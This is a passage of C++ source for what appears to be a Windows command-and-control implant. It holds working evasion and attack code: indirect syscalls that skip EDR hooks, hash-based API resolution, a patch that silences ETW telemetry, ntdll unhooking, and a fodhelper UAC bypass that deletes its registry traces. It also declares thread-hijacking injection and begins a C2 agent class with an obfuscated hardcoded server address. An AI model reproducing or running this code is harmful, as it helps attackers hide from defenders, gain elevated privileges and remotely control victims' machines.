    if (!g_api.VirtualProtect(g_indirect_stub_protect_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READ, &old_protect)) {
        // Fallback: try RWX if RX fails (some systems restrict RX-only allocations)
        if (!g_api.VirtualProtect(g_indirect_stub_protect_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READWRITE, &old_protect)) {
            cout << OBF("[INDIRECT] Failed to make stub executable") << endl;
            return false;
        }
    }

    DWORD old2;
    if (!g_api.VirtualProtect(g_indirect_stub_write_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READ, &old2)) {
        if (!g_api.VirtualProtect(g_indirect_stub_write_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READWRITE, &old2)) {
            // Restore first buffer on failure
            g_api.VirtualProtect(g_indirect_stub_protect_vm, INDIRECT_STUB_SIZE, old_protect, &old_protect);
            cout << OBF("[INDIRECT] Failed to make second stub executable") << endl;
            return false;
        }
    }

    // Cast buffers to function pointers
    g_IndirectProtectVirtualMemory = (tIndirectProtectVirtualMemory)(void*)g_indirect_stub_protect_vm;
    g_IndirectWriteVirtualMemory   = (tIndirectWriteVirtualMemory)(void*)g_indirect_stub_write_vm;
    g_indirect_initialized = true;

    cout << OBF("[+] Indirect Syscall active — jumping to ntdll's syscall;ret (stealth)") << endl;
    return true;
}

// Indirect VirtualProtect — jumps to ntdll's syscall;ret, bypasses all ntdll EDR hooks
// Falls back to normal VirtualProtect if indirect syscall didn't initialize.
static bool virtualProtectDirect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect) {
    if (!g_indirect_initialized) {
        return g_api.VirtualProtect(address, size, newProtect, oldProtect);
    }

    HANDLE hProcess   = (HANDLE)(LONG_PTR)-1;  // NtCurrentProcess (-1)
    PVOID  baseAddr   = address;
    SIZE_T regionSize = size;
    ULONG  oldProt;

    NTSTATUS status = g_IndirectProtectVirtualMemory(hProcess, &baseAddr, &regionSize, newProtect, &oldProt);

    if (oldProtect) *oldProtect = (DWORD)oldProt;
    return status >= 0;
}

// Indirect WriteProcessMemory — jumps to ntdll's syscall;ret, bypasses all ntdll EDR hooks
// Falls back to WriteProcessMemory if indirect syscall didn't initialize.
static bool writeMemoryDirect(HANDLE hProcess, LPVOID baseAddress, LPCVOID buffer, SIZE_T size, SIZE_T* bytesWritten) {
    if (!g_indirect_initialized) {
        return g_api.WriteProcessMemory(hProcess, baseAddress, buffer, size, bytesWritten);
    }

    SIZE_T written = 0;
    NTSTATUS status = g_IndirectWriteVirtualMemory(hProcess, baseAddress, (PVOID)buffer, size, &written);

    if (bytesWritten) *bytesWritten = written;
    return status >= 0;
}

#endif // _WIN32

#ifdef _WIN32
// Initialize all API function pointers at runtime via hash resolution
static bool initApiTable() {
    if (g_api_initialized) return true;

    // Get kernel32 handle via PEB walks
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return false;

    HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));

    // Resolve LoadLibraryA first — needed to load ws2_32 etc.
    g_api.LoadLibraryA = (HMODULE (WINAPI*)(LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("LoadLibraryA"));
    if (!g_api.LoadLibraryA) return false;

    // Resolve all kernel32 functions
    g_api.CreateFileA          = (HANDLE (WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))resolveApiByHash(hKernel, COMPILE_HASH("CreateFileA"));
    g_api.CreateFileMappingA   = (HANDLE (WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("CreateFileMappingA"));
    g_api.MapViewOfFile        = (LPVOID (WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))resolveApiByHash(hKernel, COMPILE_HASH("MapViewOfFile"));
    g_api.UnmapViewOfFile      = (BOOL (WINAPI*)(LPCVOID))resolveApiByHash(hKernel, COMPILE_HASH("UnmapViewOfFile"));
    g_api.CloseHandle          = (BOOL (WINAPI*)(HANDLE))resolveApiByHash(hKernel, COMPILE_HASH("CloseHandle"));
    g_api.VirtualProtect       = (BOOL (WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualProtect"));
    g_api.WriteProcessMemory   = (BOOL (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))resolveApiByHash(hKernel, COMPILE_HASH("WriteProcessMemory"));
    g_api.CreateProcessA       = (BOOL (WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))resolveApiByHash(hKernel, COMPILE_HASH("CreateProcessA"));
    g_api.OpenProcess          = (HANDLE (WINAPI*)(DWORD, BOOL, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("OpenProcess"));
    g_api.TerminateProcess     = (BOOL (WINAPI*)(HANDLE, UINT))resolveApiByHash(hKernel, COMPILE_HASH("TerminateProcess"));
    g_api.VirtualFreeEx        = (BOOL (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualFreeEx"));
    g_api.VirtualAllocEx       = (LPVOID (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualAllocEx"));
    g_api.VirtualProtectEx     = (BOOL (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD))resolveApiByHash(hKernel, COMPILE_HASH("VirtualProtectEx"));
    g_api.WaitForSingleObject  = (DWORD (WINAPI*)(HANDLE, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("WaitForSingleObject"));
    g_api.CreateToolhelp32Snapshot = (HANDLE (WINAPI*)(DWORD, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("CreateToolhelp32Snapshot"));
    g_api.Process32FirstW      = (BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))resolveApiByHash(hKernel, COMPILE_HASH("Process32FirstW"));
    g_api.Process32NextW       = (BOOL (WINAPI*)(HANDLE, LPPROCESSENTRY32W))resolveApiByHash(hKernel, COMPILE_HASH("Process32NextW"));
    g_api.GetProcessHeap       = (HANDLE (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetProcessHeap"));
    g_api.HeapAlloc            = (LPVOID (WINAPI*)(HANDLE, DWORD, SIZE_T))resolveApiByHash(hKernel, COMPILE_HASH("HeapAlloc"));
    g_api.HeapFree             = (BOOL (WINAPI*)(HANDLE, DWORD, LPVOID))resolveApiByHash(hKernel, COMPILE_HASH("HeapFree"));
    g_api.GetModuleFileNameA   = (DWORD (WINAPI*)(HMODULE, LPSTR, DWORD))resolveApiByHash(hKernel, COMPILE_HASH("GetModuleFileNameA"));
    g_api.DeleteFileA          = (BOOL (WINAPI*)(LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("DeleteFileA"));
    g_api.MoveFileA            = (BOOL (WINAPI*)(LPCSTR, LPCSTR))resolveApiByHash(hKernel, COMPILE_HASH("MoveFileA"));
    g_api.GetLastError         = (DWORD (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetLastError"));
    g_api.GetUserNameA         = (BOOL (WINAPI*)(LPSTR, LPDWORD))resolveApiByHash(hKernel, COMPILE_HASH("GetUserNameA"));
    g_api.WinExec              = (UINT (WINAPI*)(LPCSTR, UINT))resolveApiByHash(hKernel, COMPILE_HASH("WinExec"));
    g_api.FreeLibrary          = (BOOL (WINAPI*)(HMODULE))resolveApiByHash(hKernel, COMPILE_HASH("FreeLibrary"));
    g_api.GetCurrentProcessId  = (DWORD (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetCurrentProcessId"));
    g_api.GetCurrentThreadId   = (DWORD (WINAPI*)(void))resolveApiByHash(hKernel, COMPILE_HASH("GetCurrentThreadId"));
    g_api.Sleep                = (void (WINAPI*)(DWORD))resolveApiByHash(hKernel, COMPILE_HASH("Sleep"));
    g_api.InitializeProcThreadAttributeList = (BOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T))resolveApiByHash(hKernel, COMPILE_HASH("InitializeProcThreadAttributeList"));
    g_api.DeleteProcThreadAttributeList     = (BOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST))resolveApiByHash(hKernel, COMPILE_HASH("DeleteProcThreadAttributeList"));
    g_api.UpdateProcThreadAttribute         = (BOOL (WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PVOID))resolveApiByHash(hKernel, COMPILE_HASH("UpdateProcThreadAttribute"));

    // Load ws2_32.dll and resolve network functions
    HMODULE hWs2 = g_api.LoadLibraryA(OBF("ws2_32.dll"));
    if (hWs2) {
        *(FARPROC*)&g_api.WSAStartup  = resolveApiByHash(hWs2, COMPILE_HASH("WSAStartup"));
        *(FARPROC*)&g_api.WSACleanup  = resolveApiByHash(hWs2, COMPILE_HASH("WSACleanup"));
        *(FARPROC*)&g_api.socket      = resolveApiByHash(hWs2, COMPILE_HASH("socket"));
        *(FARPROC*)&g_api.connect     = resolveApiByHash(hWs2, COMPILE_HASH("connect"));
        *(FARPROC*)&g_api.send        = resolveApiByHash(hWs2, COMPILE_HASH("send"));
        *(FARPROC*)&g_api.recv        = resolveApiByHash(hWs2, COMPILE_HASH("recv"));
        *(FARPROC*)&g_api.closesocket = resolveApiByHash(hWs2, COMPILE_HASH("closesocket"));
        *(FARPROC*)&g_api.htons       = resolveApiByHash(hWs2, COMPILE_HASH("htons"));
        *(FARPROC*)&g_api.inet_pton   = resolveApiByHash(hWs2, COMPILE_HASH("inet_pton"));
    }

    // Resolve advapi32 registry functions
    HMODULE hAdvapi = getModuleByHash(COMPILE_HASH("advapi32"));
    if (hAdvapi) {
        *(FARPROC*)&g_api.RegCreateKeyExA  = resolveApiByHash(hAdvapi, COMPILE_HASH("RegCreateKeyExA"));
        *(FARPROC*)&g_api.RegSetValueExA   = resolveApiByHash(hAdvapi, COMPILE_HASH("RegSetValueExA"));
        *(FARPROC*)&g_api.RegOpenKeyExA    = resolveApiByHash(hAdvapi, COMPILE_HASH("RegOpenKeyExA"));
        *(FARPROC*)&g_api.RegQueryValueExA = resolveApiByHash(hAdvapi, COMPILE_HASH("RegQueryValueExA"));
        *(FARPROC*)&g_api.RegCloseKey      = resolveApiByHash(hAdvapi, COMPILE_HASH("RegCloseKey"));
        *(FARPROC*)&g_api.RegDeleteKeyExA  = resolveApiByHash(hAdvapi, COMPILE_HASH("RegDeleteKeyExA"));
    }

    // Resolve shell32 (ShellExecuteExA)
    HMODULE hShell32 = getModuleByHash(COMPILE_HASH("shell32"));
    if (hShell32) {
        *(FARPROC*)&g_api.ShellExecuteExA = resolveApiByHash(hShell32, COMPILE_HASH("ShellExecuteExA"));
    }

    g_api_initialized = true;
    return true;
}

#endif // _WIN32 - ApiTable


// ============================================================================
// ETW BYPASS - Patch EtwEventWrite to silently drop all ETW telemetry
// Every Windows API call (CreateProcess, WriteFile, VirtualAlloc, network)
// fires an ETW event. EDRs subscribe to these events. Patching EtwEventWrite
// makes every event vanish — the EDR never sees what we're doing.
//
// The patch: "xor eax, eax; ret" — returns 0 (success) without doing
// anything, silently dropping every ETW event that would otherwise fire.
// ============================================================================
#ifdef _WIN32
void patchETW() {
    // ---------------------------------------------------------------
    // METHOD: Restore clean EtwEventWrite from ntdll on disk, then
    // apply runtime modification. Removes EDR hooks AND disables ETW.
    // ---------------------------------------------------------------

    // Function-scope variables needed by fallback labels
    FARPROC pEtwEventWrite = NULL;

    // Main logic block — local variables go out of scope before goto labels
    {

    // Step 1: Get in-memory ntdll base via PEB walk (no strings, no IAT)
    HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdll) {
        cout << OBF("[ETW] ntdll.dll not found") << endl;
        return;
    }

    // Step 2: Resolve EtwEventWrite by hash
    pEtwEventWrite = resolveApiByHash(hNtdll, COMPILE_HASH("EtwEventWrite"));
    if (!pEtwEventWrite) {
        cout << OBF("[ETW] EtwEventWrite not found") << endl;
        return;
    }

    // Step 3: Open clean ntdll.dll from disk
    HANDLE _etw_file = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (_etw_file == INVALID_HANDLE_VALUE) {
        cout << OBF("[ETW] Could not open ntdll from disk, using fallback") << endl;
        goto fallback_patch_etw;
    }

    HANDLE _etw_map = g_api.CreateFileMappingA(_etw_file, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!_etw_map) {
        g_api.CloseHandle(_etw_file);
        goto fallback_patch_etw;
    }

    LPVOID _etw_disk = g_api.MapViewOfFile(_etw_map, FILE_MAP_READ, 0, 0, 0);
    if (!_etw_disk) {
        g_api.CloseHandle(_etw_map);
        g_api.CloseHandle(_etw_file);
        goto fallback_patch_etw;
    }

    // Step 4: Find EtwEventWrite in the clean disk copy
    bool _etw_restored = false;
    IMAGE_DOS_HEADER* _etw_dos = (IMAGE_DOS_HEADER*)_etw_disk;
    IMAGE_NT_HEADERS* _etw_nt = (IMAGE_NT_HEADERS*)((BYTE*)_etw_disk + _etw_dos->e_lfanew);

    if (_etw_dos->e_magic == IMAGE_DOS_SIGNATURE && _etw_nt->Signature == IMAGE_NT_SIGNATURE) {
        IMAGE_EXPORT_DIRECTORY* _etw_exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)_etw_disk +
            _etw_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* _etw_names     = (DWORD*)((BYTE*)_etw_disk + _etw_exports->AddressOfNames);
        WORD*  _etw_ordinals  = (WORD*)((BYTE*)_etw_disk + _etw_exports->AddressOfNameOrdinals);
        DWORD* _etw_functions = (DWORD*)((BYTE*)_etw_disk + _etw_exports->AddressOfFunctions);

        unsigned long _etw_target = COMPILE_HASH("EtwEventWrite");
        BYTE* _clean_etw_func = NULL;

        for (DWORD _i = 0; _i < _etw_exports->NumberOfNames; _i++) {
            if (!_etw_names[_i]) continue;
            char* _name = (char*)((BYTE*)_etw_disk + _etw_names[_i]);
            unsigned long _h = 5381;
            int _c;
            while ((_c = *_name++)) _h = ((_h << 5) + _h) + _c;
            if (_h == _etw_target) {
                _clean_etw_func = (BYTE*)_etw_disk + _etw_functions[_etw_ordinals[_i]];
                break;
            }
        }

        if (_clean_etw_func) {
            // Step 5: Read the clean function's first bytes
            #ifdef _WIN64
                unsigned char _clean_etw_bytes[4];
                memcpy(_clean_etw_bytes, _clean_etw_func, 4);
            #else
                unsigned char _clean_etw_bytes[5];
                memcpy(_clean_etw_bytes, _clean_etw_func, 5);
            #endif

            // Step 6: Apply runtime modification — XOR obfuscated against
            // the clean bytes so no hardcoded patch pattern exists in binary.
            // x64 patch: xor rax, rax; ret  (0x48 0x33 0xC0 0xC3)
            // x86 patch: xor eax, eax; ret 16 (0x33 0xC0 0xC2 0x10 0x00)
            #ifdef _WIN64
                unsigned char _etw_patch[4] = { 0x48, 0x33, 0xC0, 0xC3 };
                unsigned char _etw_obf[4];
                for (int _i = 0; _i < 4; _i++)
                    _etw_obf[_i] = _etw_patch[_i] ^ _clean_etw_bytes[_i % 4];
            #else
                unsigned char _etw_patch[5] = { 0x33, 0xC0, 0xC2, 0x10, 0x00 };
                unsigned char _etw_obf[5];
                for (int _i = 0; _i < 5; _i++)
                    _etw_obf[_i] = _etw_patch[_i] ^ _clean_etw_bytes[_i % 5];
            #endif

            // Step 7: Randomize timing
            random_device _rd;
            srand(_rd() ^ (unsigned int)__rdtsc());
            g_api.Sleep(200 + (rand() % 800));
            initIndirectSyscall();

            // Step 8: De-obfuscate using the same clean bytes and write
            DWORD _old;
            #ifdef _WIN64
                unsigned char _final_patch[4];
                for (int _i = 0; _i < 4; _i++)
                    _final_patch[_i] = _etw_obf[_i] ^ _clean_etw_bytes[_i % 4];
            #else
                unsigned char _final_patch[5];
                for (int _i = 0; _i < 5; _i++)
                    _final_patch[_i] = _etw_obf[_i] ^ _clean_etw_bytes[_i % 5];
            #endif

            if (virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_final_patch), PAGE_EXECUTE_READWRITE, &_old)) {
                memcpy((void*)pEtwEventWrite, _final_patch, sizeof(_final_patch));
                virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_final_patch), _old, &_old);
                cout << OBF("[+] ETW Bypass — restored from ntdll on disk + patch applied") << endl;
                _etw_restored = true;
            }
        }
    }

    g_api.UnmapViewOfFile(_etw_disk);
    g_api.CloseHandle(_etw_map);
    g_api.CloseHandle(_etw_file);

    if (_etw_restored) return;
    }

fallback_patch_etw:
    // Fallback: direct XOR-masked patch (no disk access available)
    {
        #ifdef _WIN64
            unsigned char _patch[4];
            const unsigned char _mask[4] = { 0x35, 0x44, 0xB7, 0xB4 };
            const unsigned char _xork[4] = { 0x7D, 0x77, 0x77, 0x77 };
            for (int _i = 0; _i < 4; _i++) _patch[_i] = _mask[_i] ^ _xork[_i];
        #else
            unsigned char _patch[5];
            const unsigned char _mask[5] = { 0x44, 0xB7, 0xB5, 0x67, 0x77 };
            const unsigned char _xork[5] = { 0x77, 0x77, 0x77, 0x77, 0x77 };
            for (int _i = 0; _i < 5; _i++) _patch[_i] = _mask[_i] ^ _xork[_i];
        #endif

        random_device _rd;
        srand(_rd() ^ (unsigned int)__rdtsc());
        g_api.Sleep(200 + (rand() % 800));
        initIndirectSyscall();

        DWORD _old;
        if (virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_patch), PAGE_EXECUTE_READWRITE, &_old)) {
            memcpy((void*)pEtwEventWrite, _patch, sizeof(_patch));
            virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_patch), _old, &_old);
            cout << OBF("[+] ETW Bypass successful (fallback)") << endl;
        } else {
            cout << OBF("[-] ETW Bypass failed: ") << g_api.GetLastError() << endl;
        }
    }
}
#else
inline void patchETW() {
    // ETW is Windows-only; no-op on other platforms
}
#endif

// ============================================================================
// SYSCALL UNHOOKING - Restore clean ntdll.dll from disk to remove EDR hooks
// ============================================================================
// EDRs hook userland API calls by overwriting the first bytes of functions
// in ntdll.dll (in memory) with a JMP to their own DLL for inspection.
// This function:
//   1. Loads a clean copy of ntdll.dll from disk (C:\Windows\System32)
//   2. Parses the PE header to find the .text section
//   3. Copies the clean .text bytes over the in-memory version
//
// After unhooking, every syscall (NtCreateThreadEx, NtAllocateVirtualMemory,
// etc.) goes directly to the kernel without EDR inspection.
// ============================================================================
#ifdef _WIN32
void unhookNtdll() {
    // Step 1: Get in-memory ntdll base address via PEB walk — no GetModuleHandleA call
    HMODULE hNtdllMem = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdllMem) {
        cout << OBF("[UNHOOK] Failed to get ntdll base") << endl;
        return;
    }

    BYTE* mem_base = (BYTE*)hNtdllMem;

    // Step 2: Resolve required WinAPI functions by hash
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return;

    typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef HANDLE (WINAPI *pCreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
    typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    typedef BOOL  (WINAPI *pUnmapViewOfFile)(LPCVOID);
    typedef BOOL  (WINAPI *pCloseHandle)(HANDLE);

    pCreateFileA       _CreateFileA       = (pCreateFileA)resolveApiByHash(hKernel, COMPILE_HASH("CreateFileA"));
    pCreateFileMappingA _CreateFileMappingA = (pCreateFileMappingA)resolveApiByHash(hKernel, COMPILE_HASH("CreateFileMappingA"));
    pMapViewOfFile     _MapViewOfFile     = (pMapViewOfFile)resolveApiByHash(hKernel, COMPILE_HASH("MapViewOfFile"));
    pUnmapViewOfFile   _UnmapViewOfFile   = (pUnmapViewOfFile)resolveApiByHash(hKernel, COMPILE_HASH("UnmapViewOfFile"));
    pCloseHandle       _CloseHandle       = (pCloseHandle)resolveApiByHash(hKernel, COMPILE_HASH("CloseHandle"));

    if (!_CreateFileA || !_CreateFileMappingA || !_MapViewOfFile || !_CloseHandle) {
        cout << OBF("[UNHOOK] Failed to resolve required APIs") << endl;
        return;
    }

    // Step 3: Open clean ntdll.dll from disk
    string ntdll_path = OBF("C:\\Windows\\System32\\ntdll.dll");

    HANDLE hFile = g_api.CreateFileA(ntdll_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        cout << OBF("[UNHOOK] Failed to open ntdll.dll from disk") << endl;
        return;
    }

    HANDLE hMapping = g_api.CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) {
        g_api.CloseHandle(hFile);
        cout << OBF("[UNHOOK] CreateFileMapping failed") << endl;
        return;
    }

    LPVOID disk_map = g_api.MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!disk_map) {
        g_api.CloseHandle(hMapping);
        g_api.CloseHandle(hFile);
        cout << OBF("[UNHOOK] MapViewOfFile failed") << endl;
        return;
    }

    // Step 4: Parse PE headers to validate both copies
    IMAGE_DOS_HEADER* dos_disk = (IMAGE_DOS_HEADER*)disk_map;
    IMAGE_DOS_HEADER* dos_mem  = (IMAGE_DOS_HEADER*)mem_base;

    if (dos_disk->e_magic != IMAGE_DOS_SIGNATURE || dos_mem->e_magic != IMAGE_DOS_SIGNATURE) {
        g_api.UnmapViewOfFile(disk_map);
        g_api.CloseHandle(hMapping);
        g_api.CloseHandle(hFile);
        cout << OBF("[UNHOOK] Invalid PE signature") << endl;
        return;
    }

    IMAGE_NT_HEADERS* nt_disk = (IMAGE_NT_HEADERS*)((BYTE*)disk_map + dos_disk->e_lfanew);
    IMAGE_NT_HEADERS* nt_mem  = (IMAGE_NT_HEADERS*)(mem_base + dos_mem->e_lfanew);

    if (nt_disk->Signature != IMAGE_NT_SIGNATURE || nt_mem->Signature != IMAGE_NT_SIGNATURE) {
        g_api.UnmapViewOfFile(disk_map);
        g_api.CloseHandle(hMapping);
        g_api.CloseHandle(hFile);
        cout << OBF("[UNHOOK] Invalid NT signature") << endl;
        return;
    }

    // Step 5: Find .text section and restore from disk
    // .text section contains all executable syscall stubs that EDRs hook
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt_disk);
    WORD sections_count = nt_disk->FileHeader.NumberOfSections;
    int restored = 0;
    bool hooks_found = false;

    for (WORD i = 0; i < sections_count; i++) {
        // Match by name: .text (executable code section)
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* disk_code = (BYTE*)disk_map + sections[i].PointerToRawData;
            BYTE* mem_code  = mem_base + sections[i].VirtualAddress;
            DWORD section_size = sections[i].SizeOfRawData;

            if (section_size == 0) continue;

            // Check if hooks are present (memory differs from disk)
            if (memcmp(mem_code, disk_code, min(section_size, (DWORD)256)) != 0) {
                hooks_found = true;
            }

            // Make memory writable, restore from disk, restore protection
            DWORD old_prot;
            if (virtualProtectDirect(mem_code, section_size, PAGE_EXECUTE_READWRITE, &old_prot)) {
                memcpy(mem_code, disk_code, section_size);
                virtualProtectDirect(mem_code, section_size, old_prot, &old_prot);
                restored++;
            }
            break;  // .text is typically one section, no need to keep scanning
        }
    }

    // Step 6: Also restore .rdata (may contain EDR callback pointers)
    for (WORD i = 0; i < sections_count; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            // Skip .text — already restored above
            if (memcmp(sections[i].Name, ".text", 5) == 0) continue;

            BYTE* disk_code = (BYTE*)disk_map + sections[i].PointerToRawData;
            BYTE* mem_code  = mem_base + sections[i].VirtualAddress;
            DWORD section_size = sections[i].SizeOfRawData;

            if (section_size == 0) continue;

            DWORD old_prot;
            if (virtualProtectDirect(mem_code, section_size, PAGE_EXECUTE_READWRITE, &old_prot)) {
                memcpy(mem_code, disk_code, section_size);
                virtualProtectDirect(mem_code, section_size, old_prot, &old_prot);
                restored++;
            }
        }
    }

    g_api.UnmapViewOfFile(disk_map);
    g_api.CloseHandle(hMapping);
    g_api.CloseHandle(hFile);

    if (hooks_found) {
        cout << OBF("[+] Syscall Unhooking — EDR hooks detected and removed (") << restored << OBF(" sections)") << endl;
    } else {
        cout << OBF("[+] Syscall Unhooking — no hooks found (") << restored << OBF(" sections verified)") << endl;
    }
}
#else
inline void unhookNtdll() {
    // NTDLL unhooking is Windows-only; no-op on other platforms
}
#endif

// ============================================================================
// UAC BYPASS - fodhelper.exe Registry Hijack (No Admin Required)
// Uses HKCU\Software\Classes\ms-settings\Shell\Open\command
// Windows auto-elevates fodhelper.exe, which reads the handler from HKCU
// ============================================================================
#ifdef _WIN32
void bypassUac(const string& command_to_execute = "") {
    // Default command: launch an elevated cmd.exe PowerShell wrapper
    string cmd = command_to_execute;
    if (cmd.empty()) {
        cmd = OBF("C:\\Windows\\System32\\cmd.exe /c start cmd.exe");
    }

    HKEY hKey;
    LONG result;

    // Create the registry path — obfuscated to hide from YARA/signatures
    string reg_path = OBF("Software\\Classes\\ms-settings\\Shell\\Open\\command");

    result = g_api.RegCreateKeyExA(HKEY_CURRENT_USER, reg_path.c_str(), 0, NULL,
                             REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        cout << "[-] UAC Bypass — failed to create registry key: " << result << endl;
        return;
    }

    // Set DelegateExecute to empty string (required for the bypass to work)
    result = g_api.RegSetValueExA(hKey, OBF("DelegateExecute"), 0, REG_SZ, (BYTE*)"", 1);
    if (result != ERROR_SUCCESS) {
        g_api.RegCloseKey(hKey);
        cout << OBF("[-] UAC Bypass — failed to set DelegateExecute: ") << result << endl;
        return;
    }

    // Set default value to the command we want to execute elevated
    result = g_api.RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)cmd.c_str(), cmd.length() + 1);
    if (result != ERROR_SUCCESS) {
        g_api.RegCloseKey(hKey);
        cout << "[-] UAC Bypass — failed to set command: " << result << endl;
        return;
    }

    g_api.RegCloseKey(hKey);

    // Trigger fodhelper.exe — Windows auto-elevates it because it's a trusted binary
    // When fodhelper runs, it checks HKCU\Classes\ms-settings\Shell\Open\command
    // and executes our command with elevated privileges
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(SHELLEXECUTEINFOA);
    sei.lpFile = OBF("fodhelper.exe");
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (g_api.ShellExecuteExA(&sei)) {
        // Wait briefly for execution to start
        g_api.WaitForSingleObject(sei.hProcess, 3000);
        g_api.CloseHandle(sei.hProcess);
        cout << OBF("[+] UAC Bypass triggered") << endl;
    } else {
        cout << OBF("[-] UAC Bypass — failed: ") << g_api.GetLastError() << endl;
    }

    // Clean up registry keys to remove forensic evidence — obfuscated paths
    g_api.RegDeleteKeyExA(HKEY_CURRENT_USER, OBF("Software\\Classes\\ms-settings\\Shell\\Open\\command"), KEY_WOW64_64KEY, 0);
    g_api.RegDeleteKeyExA(HKEY_CURRENT_USER, OBF("Software\\Classes\\ms-settings\\Shell"), KEY_WOW64_64KEY, 0);
}
#else
inline void bypassUac(const string& command_to_execute = "") {
    // UAC bypass is Windows-only; no-op on other platforms
}
#endif

// ============================================================================
// installPersistence() is now defined in persistence.cpp
// ============================================================================

// ============================================================================
// THREAD HIJACKING - Forward Declaration
// ============================================================================

// Forward declaration of global Thread Hijacking function (replaces APC Injection to avoid CobaltStrike signature)
string performThreadHijacking(const string& process_name, const string& payload_data);

// ThreadlessInject — hooks NtDelayExecution via function hooking (no new thread, no context modification)
string performThreadlessInject(const string& process_name, const string& payload_hex);

// ============================================================================
// NOTE: The old STR_KEY 0xAA XOR-based API string helpers (getOpenProcess,
// getVirtualAllocEx, etc.) and buildKernel32Dll/buildCreateToolhelp32Snapshot/
// buildProcess32First have been removed.
// They are fully replaced by resolveApiByHash() from obfuscation.h.
// ============================================================================

class C2Agent {
private:
    string server_ip;
    int server_port;
    string bot_id;
    int client_socket;
    bool connected;
    bool running;
    unsigned char session_key[32];  // Per-session encryption key
    bool session_encryption;        // Encryption enabled flag
    uint32_t transport_counter;             // ChaCha20 counter for transport encryption
    map<string, ofstream*> upload_files_;   // Track open upload file handles by transfer_id
    map<string, string> upload_paths_;       // Track upload file paths by transfer_id

public:
    C2Agent(const string& ip = "", int port = 8080)
        : server_port(port), client_socket(-1), connected(false), running(true), session_encryption(false), transport_counter(0) {
        // XOR obfuscated default IP: "10.211.129.191" ^ 0x55 = "teogttotg lotlt"
        string enc_ip = "teogttotg lotlt";
        if (ip.empty()) {
            server_ip = xorDecrypt(enc_ip);
        } else {
            server_ip = ip;
        }

        // Generate per-session encryption key (rotates each connection)
        random_device rd;
        mt19937 gen(rd());
        for (int i = 0; i < 32; i++) {
            session_key[i] = (unsigned char)(rd() ^ (i * 17 + 31));
        }            generateBotID();
            #ifdef _WIN32
                WSADATA wsaData;
                g_api.WSAStartup(MAKEWORD(2, 2), &wsaData);

                // AMSI and UAC bypasses are now executed in c2_background_thread()
